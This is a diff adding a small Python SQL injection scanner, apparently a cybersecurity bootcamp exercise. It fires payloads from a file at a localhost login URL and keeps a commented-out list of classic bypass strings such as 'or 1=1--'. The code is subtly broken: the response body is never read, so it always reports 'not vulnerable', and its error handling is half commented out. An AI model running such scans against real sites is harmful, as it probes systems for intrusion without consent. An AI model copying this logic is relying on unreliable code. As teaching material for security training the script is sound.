@@ -1,0 +1,44 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+__author__ = "rikrdo"
+__copyright__ = "Copyright 2022, Bootcamp Cybersec "
+__credits__ = ["rikrdo"]
+__license__ = "GPL"
+__version__ = "1.0.1"
+__maintainer__ = "rikrdo"
+__email__ = "rikrdo@rikrdo.es"
+__status__ = "Production"
+
+# required libraries
+
+import sys, requests
+
+
+#fullurl = input("Url: ")
+fullurl = "http://localhost:8888/mysql.php?user=&pass="
+errormsg = "You have an error in your SQL syntax"
+#payloads = ["'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'or 1=1", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "'or 1=1/*", "'or 1=1--"]
+errorr = "yes"
+
+for payload in open("payloads.txt", "r").readlines():
+   fullbody = ''
+   #resp = urllib.request.urlopen(fullurl + payload)
+   resp = requests.get(fullurl + payload)
+   print(resp)
+   #body = resp.read()
+   #fullbody = body.decode('utf-8')
+
+   #except:
+   #   print ("[-] Error! Manually check this payload: " + payload)
+   #   errorr = "no"
+   #   #sys.exit()
+
+   if errormsg in fullbody:
+      if errorr == "no":
+         print ("[-] That payload might not work!")
+         errorr = "yes"
+      else:
+         print ("[+] The website is SQL injection vulnerable! Payload: " + payload)
+   else:
+      print ("[-] The website is not SQL injection vulnerable!")
